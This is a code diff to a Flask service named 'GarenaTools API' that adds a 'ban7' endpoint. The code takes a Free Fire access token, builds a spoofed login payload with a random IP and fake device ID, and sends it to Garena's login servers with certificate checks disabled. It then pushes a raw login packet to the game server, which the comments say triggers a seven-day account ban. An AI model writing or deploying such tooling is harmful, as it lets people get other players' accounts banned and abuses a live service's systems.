@@ -292,6 +292,126 @@ def spam_loop(uid, ip, port, packet, iv_ms, end_time):
 @app.route('/', methods=['GET'])
 def index(): return 'GarenaTools API OK', 200
 
+# ═══════════════════════════════════════
+# BAN 7 DAYS LOGIC (adapted from Ban7/core.py)
+# ═══════════════════════════════════════
+
+# ---------------- SimpleProtobuf Class (for Ban7)  ---------------- #
+class SimpleProtobuf:
+    @staticmethod
+    def encode_varint(value):
+        result = bytearray()
+        while value > 0x7F:
+            result.append((value & 0x7F) | 0x80)
+            value >>= 7
+        result.append(value & 0x7F)
+        return bytes(result)   
+
+    @staticmethod
+    def encode_string(field_number, value):
+        if isinstance(value, str): value = value.encode('utf-8')        
+        result = bytearray()
+        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
+        result.extend(SimpleProtobuf.encode_varint(len(value)))
+        result.extend(value)
+        return bytes(result)   
+
+    @staticmethod
+    def encode_int32(field_number, value):
+        result = bytearray()
+        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 0))
+        result.extend(SimpleProtobuf.encode_varint(value))
+        return bytes(result)   
+
+    @staticmethod
+    def create_ban_payload(open_id, access_token, platform):
+        p = str(platform)
+        random_ip = f"1{random.randint(0,9)}{random.randint(0,9)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+        random_device = f"Google|{str(uuid.uuid4())}"
+        payload = bytearray()
+        payload.extend(SimpleProtobuf.encode_string(3,  datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
+        payload.extend(SimpleProtobuf.encode_string(4,  "free fire"))
+        payload.extend(SimpleProtobuf.encode_int32 (5,  4))
+        payload.extend(SimpleProtobuf.encode_string(7,  "1.123.1"))
+        payload.extend(SimpleProtobuf.encode_string(8,  "Android OS 11 / API-30 (RP1A.200720.012/G991BXXU3AUL1)"))
+        payload.extend(SimpleProtobuf.encode_string(19, random_device))
+        payload.extend(SimpleProtobuf.encode_string(20, random_ip))
+        payload.extend(SimpleProtobuf.encode_string(22, open_id))
+        payload.extend(SimpleProtobuf.encode_string(23, p))
+        payload.extend(SimpleProtobuf.encode_string(29, access_token))
+        payload.extend(SimpleProtobuf.encode_string(99, p))
+        return bytes(payload)
+
+def ban7_logic(access_token, platform_manual=None):
+    try:
+        # Step 1: Inspect token
+        open_id, platform = inspect_token(access_token)
+        platform_ = platform_manual if platform_manual else platform
+
+        # Step 2: MajorLogin
+        payload = SimpleProtobuf.create_ban_payload(open_id, access_token, platform_)
+        enc = aes_enc(payload) # Uses default AES_KEY/IV which are correct
+
+        r = requests.post(
+            "https://loginbp.ggpolarbear.com/MajorLogin",
+            headers={
+                "Host": "loginbp.ggpolarbear.com",
+                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)",
+                "Connection": "Keep-Alive",
+                "Content-Type": "application/octet-stream",
+                "X-GA": "v1 1",
+                "X-Unity-Version": "2018.4.11f1",
+                "ReleaseVersion": "OB53"
+            },
+            data=enc, verify=False, timeout=15
+        )
+        if not r.ok: return {"success": False, "message": f"MajorLogin HTTP {r.status_code}"}
+
+        # Step 3: Parse response
+        # Using existing major_login parsing logic but with the custom key/iv
+        tok, k, v = None, None, None
+        try:
+            from MajorLogin_res_pb2 import MajorLoginRes
+            res = MajorLoginRes()
+            dec = aes_dec(r.content, key, iv)
+            res.ParseFromString(dec if dec else r.content)
+            if res.account_jwt:
+                tok, k, v = res.account_jwt, bytes(res.key), bytes(res.iv)
+        except: pass
+
+        if not tok:
+            p = proto_parse(aes_dec(r.content, key, iv) or r.content)
+            tok = pget(p, 8)
+            k = pget(p, 22) or AES_KEY
+            v = pget(p, 23) or AES_IV
+
+        if not tok: return {"success": False, "message": "Parse MajorLogin failed"}
+
+        # Step 4: GetLoginData
+        # We need the online_ip and port
+        online_ip, online_port, _, _ = get_login_data(tok, open_id, access_token, platform_)
+
+        # Step 5: Build and send packet
+        # Use the specific build_login_packet but ensure timestamp/exp is handled
+        packet = build_login_packet(tok, k, v)
+        
+        recv_len = send_packet_tcp(online_ip, online_port, packet)
+        
+        if recv_len > 0:
+            pl = decode_jwt(tok)
+            return {
+                "success": True,
+                "account_id": pl.get("account_id"),
+                "nickname": pl.get("nickname"),
+                "platform": platform_,
+                "msg": "Đã gửi packet thành công!"
+            }
+        else:
+            return {"success": False, "message": "Không nhận được phản hồi từ server"}
+
+    except Exception as e:
+        return {"success": False, "message": str(e)}
+
 @app.route('/api', methods=['POST','OPTIONS'])
 def api():
     if request.method == 'OPTIONS':
@@ -299,6 +419,17 @@ def api():
     d   = ji()
     act = d.get('action','')
     uid = d.get('uid')
+
+    # ── BAN 7 DAYS ──
+    if act == 'ban7':
+        at = d.get('access_token','')
+        pt = d.get('platform')
+        if not at: return err('Access token required')
+        res = ban7_logic(at, pt)
+        if res.get('success'):
+            return ok(res, res['msg'])
+        else:
+            return err(res.get('message', 'Thất bại'))
 
     # ── CHECK EMAIL ──
     if act == 'check_email':
